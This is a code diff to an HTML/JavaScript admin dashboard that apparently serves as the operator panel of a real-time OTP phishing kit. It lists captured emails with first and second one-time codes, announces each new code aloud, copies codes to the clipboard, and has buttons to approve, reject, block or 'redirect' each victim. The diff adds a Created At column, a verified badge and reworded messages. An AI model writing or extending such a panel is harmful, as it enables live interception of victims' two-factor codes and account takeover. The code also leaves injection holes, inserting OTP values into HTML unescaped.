@@ -208,7 +208,7 @@
         table {
             width: 100%;
             border-collapse: collapse;
-            min-width: 900px;
+            min-width: 1300px;
         }
 
         th {
@@ -248,6 +248,7 @@
         .badge-waiting { background: rgba(79, 70, 229, 0.3); color: #e0e7ff; border: 1px solid rgba(79, 70, 229, 0.5); }
         .badge-email { background: rgba(249, 115, 22, 0.3); color: #fed7aa; border: 1px solid rgba(249, 115, 22, 0.5); }
         .badge-never { background: rgba(239, 68, 68, 0.3); color: #fecaca; border: 1px solid rgba(239, 68, 68, 0.5); }
+        .badge-verified { background: rgba(16, 185, 129, 0.4); color: #a7f3d0; border: 1px solid rgba(16, 185, 129, 0.6); }
 
         .action-buttons {
             display: flex;
@@ -495,15 +496,14 @@
             }
         }
 
-        /* New badge animation */
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-
         .stat-card.has-new {
             animation: pulse 1s ease-in-out 3;
             background: rgba(255, 255, 255, 0.25);
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
         }
     </style>
 </head>
@@ -603,11 +603,12 @@
                     <th>First OTP</th>
                     <th>Second OTP</th>
                     <th>Status</th>
+                    <th>Created At</th>
                     <th>Actions</th>
                 </tr>
             </thead>
             <tbody id="usersTableBody">
-                <tr><td colspan="5" style="text-align:center; padding:40px;">Loading users...</td</tr>
+                <tr><td colspan="6" style="text-align:center; padding:40px;">Loading users...</td</tr>
             </tbody>
         </table>
     </div>
@@ -717,22 +718,20 @@
         setTimeout(() => toast.remove(), 2000);
     }
 
-    function openModal(user) {
-        const modalContent = document.getElementById('modalContent');
-        modalContent.innerHTML = `
-            <div class="modal-field"><div class="modal-label">Email</div><div class="value-row"><div class="modal-value">${escapeHtml(user.email)}</div><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')"><ion-icon name="copy-outline"></ion-icon></button></div></div>
-            <div class="modal-field"><div class="modal-label">First OTP</div><div class="value-row"><div class="modal-value">${user.otp || 'Not submitted'}</div>${user.otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
-            <div class="modal-field"><div class="modal-label">Second OTP</div><div class="value-row"><div class="modal-value">${user.second_otp || 'Not submitted'}</div>${user.second_otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
-            <div class="modal-field"><div class="modal-label">Status</div><div class="modal-value" style="color: ${getStatusColor(user)}">${getStatusText(user)}</div></div>
-            <div class="modal-field"><div class="modal-label">Joined</div><div class="modal-value">${formatDate(user.created_at)}</div></div>
-        `;
-        document.getElementById('userModal').style.display = 'flex';
+    function formatDate(dateString) { 
+        const date = new Date(dateString); 
+        return `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`; 
     }
     
-    function closeModal() { document.getElementById('userModal').style.display = 'none'; }
-
-    function formatDate(dateString) { const date = new Date(dateString); return `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`; }
-    function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, function(m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }
+    function escapeHtml(str) { 
+        if (!str) return ''; 
+        return str.replace(/[&<>]/g, function(m) { 
+            if (m === '&') return '&amp;'; 
+            if (m === '<') return '&lt;'; 
+            if (m === '>') return '&gt;'; 
+            return m; 
+        }); 
+    }
 
     function getStatusText(user) {
         if (user.otp1_never) return 'Blocked';
@@ -752,13 +751,26 @@
         return '#6b7280';
     }
 
+    function openModal(user) {
+        const modalContent = document.getElementById('modalContent');
+        modalContent.innerHTML = `
+            <div class="modal-field"><div class="modal-label">Email</div><div class="value-row"><div class="modal-value">${escapeHtml(user.email)}</div><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')"><ion-icon name="copy-outline"></ion-icon></button></div></div>
+            <div class="modal-field"><div class="modal-label">First OTP</div><div class="value-row"><div class="modal-value">${user.otp || 'Not submitted'}</div>${user.otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
+            <div class="modal-field"><div class="modal-label">Second OTP</div><div class="value-row"><div class="modal-value">${user.second_otp || 'Not submitted'}</div>${user.second_otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
+            <div class="modal-field"><div class="modal-label">Status</div><div class="modal-value" style="color: ${getStatusColor(user)}">${getStatusText(user)}</div></div>
+            <div class="modal-field"><div class="modal-label">Joined</div><div class="modal-value">${formatDate(user.created_at)}</div></div>
+        `;
+        document.getElementById('userModal').style.display = 'flex';
+    }
+    
+    function closeModal() { document.getElementById('userModal').style.display = 'none'; }
+
     // ==================== TRACK PREVIOUS STATE FOR ALERTS ====================
-    let previousUserMap = new Map(); // email -> { status, otp, second_otp }
+    let previousUserMap = new Map();
     let isFirstLoad = true;
 
     function checkForNewEvents(users) {
         if (isFirstLoad) {
-            // Store initial state without alerts
             users.forEach(user => {
                 previousUserMap.set(user.email, {
                     approved: user.approved,
@@ -771,22 +783,18 @@
             return;
         }
 
-        // Check each user for changes
         users.forEach(user => {
             const previous = previousUserMap.get(user.email);
             
             if (!previous) {
-                // NEW USER! (not in previous map)
                 if (!user.otp1_never) {
                     speakText(`New signup from ${user.email}`, true);
                     showToast('New Signup', `${user.email} signed up`);
-                    // Animate the pending email stat card
                     const card = document.getElementById('pendingEmailCard');
                     card.classList.add('has-new');
                     setTimeout(() => card.classList.remove('has-new'), 3000);
                 }
             } else {
-                // Check for NEW FIRST OTP (user had no OTP before, now has OTP)
                 if (!previous.otp && user.otp && !user.otp1_never) {
                     speakText(`First OTP received from ${user.email}`, true);
                     showToast('First OTP', `${user.email} submitted OTP: ${user.otp}`);
@@ -795,7 +803,6 @@
                     setTimeout(() => card.classList.remove('has-new'), 3000);
                 }
                 
-                // Check for NEW SECOND OTP (user had first OTP approved, now has second OTP)
                 if (!previous.second_otp && user.second_otp && !user.otp1_never) {
                     speakText(`Second OTP received from ${user.email}`, true);
                     showToast('Second OTP', `${user.email} submitted second OTP`);
@@ -804,14 +811,12 @@
                     setTimeout(() => card.classList.remove('has-new'), 3000);
                 }
                 
-                // Check if user was marked as blocked/never
                 if (!previous.otp1_never && user.otp1_never) {
                     speakText(`${user.email} has been blocked`, true);
                     showToast('User Blocked', `${user.email} has been blocked`);
                 }
             }
             
-            // Update previous state
             previousUserMap.set(user.email, {
                 approved: user.approved,
                 otp: user.otp,
@@ -820,11 +825,9 @@
             });
         });
         
-        // Check for deleted users
         for (let [email, prev] of previousUserMap.entries()) {
             const stillExists = users.find(u => u.email === email);
             if (!stillExists && !isFirstLoad) {
-                // User was deleted
                 previousUserMap.delete(email);
             }
         }
@@ -836,9 +839,7 @@
             if (response.status === 403) { localStorage.removeItem('adminToken'); window.location.href = '/admin/login'; return; }
             const users = await response.json();
             
-            // Check for new events BEFORE displaying
             checkForNewEvents(users);
-            
             displayUsers(users);
             updateStats(users);
         } catch(err) { console.error(err); }
@@ -862,7 +863,7 @@
 
     function displayUsers(users) {
         const tbody = document.getElementById('usersTableBody');
-        if (!users.length) { tbody.innerHTML = '<tr><td colspan="5" class="empty-state"><ion-icon name="people-outline"></ion-icon><div>No users found</div></td></tr>'; return; }
+        if (!users.length) { tbody.innerHTML = '<tr><td colspan="6" class="empty-state"><ion-icon name="people-outline"></ion-icon><div>No users found</div></td></tr>'; return; }
         
         tbody.innerHTML = users.map(user => {
             let statusBadge = '';
@@ -880,7 +881,7 @@
                 statusBadge = '<span class="badge badge-waiting"><ion-icon name="shield-outline"></ion-icon> Pending OTP 2</span>';
             }
             else if (user.otp1_correct && user.otp2_correct) {
-                statusBadge = '<span class="badge badge-approved"><ion-icon name="checkmark-done-circle-outline"></ion-icon> Verified</span>';
+                statusBadge = '<span class="badge badge-verified"><ion-icon name="checkmark-done-circle-outline"></ion-icon> Verified</span>';
             }
             
             let actionButtons = `<div class="action-buttons">`;
@@ -911,6 +912,7 @@
                 <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.otp ? `<span class="otp-code" onclick="event.stopPropagation(); speakText('First OTP: ${user.otp.split('').join(' ')}')">${user.otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
                 <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.second_otp ? `<span class="otp-code" onclick="event.stopPropagation(); speakText('Second OTP: ${user.second_otp.split('').join(' ')}')">${user.second_otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.second_otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
                 <td>${statusBadge}</td>
+                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${formatDate(user.created_at)}</td>
                 <td>${actionButtons}</td>
             </tr>`;
         }).join('');
@@ -927,12 +929,12 @@
 
     function approveEmail(email) { apiCall('/api/admin/approve-user', 'POST', email, 'Email approved', 'Failed'); }
     function approveFirstOTP(email) { apiCall('/api/admin/approve-first-otp', 'POST', email, 'First OTP approved', 'Failed'); }
-    function successFirstOTP(email) { apiCall('/api/admin/success-first-otp', 'POST', email, 'Success! User blocked', 'Failed'); }
+    function successFirstOTP(email) { apiCall('/api/admin/success-first-otp', 'POST', email, 'Success! User redirected', 'Failed'); }
     function incorrectFirstOTP(email) { apiCall('/api/admin/incorrect-first-otp', 'POST', email, 'First OTP incorrect', 'Failed'); }
-    function neverFirstOTP(email) { if(confirm(`Mark ${email} as blocked?`)) apiCall('/api/admin/never-first-otp', 'POST', email, 'User blocked', 'Failed'); }
+    function neverFirstOTP(email) { if(confirm(`Mark ${email} as NEVER? User will be blocked.`)) apiCall('/api/admin/never-first-otp', 'POST', email, 'User blocked', 'Failed'); }
     function approveSecondOTP(email) { apiCall('/api/admin/approve-second-otp', 'POST', email, 'Second OTP approved', 'Failed'); }
     function incorrectSecondOTP(email) { apiCall('/api/admin/incorrect-second-otp', 'POST', email, 'Second OTP incorrect', 'Failed'); }
-    function resetUser(email) { if(confirm(`Reset ${email}? Will create new record.`)) apiCall('/api/admin/reset-user', 'POST', email, 'User reset', 'Failed'); }
+    function resetUser(email) { if(confirm(`Reset ${email}? This will create a new record.`)) apiCall('/api/admin/reset-user', 'POST', email, 'User reset', 'Failed'); }
     function deleteUser(email) { if(confirm(`Delete ${email} permanently?`)) apiCall('/api/admin/delete-user', 'DELETE', email, 'User deleted', 'Failed'); }
 
     function setupTheme() {
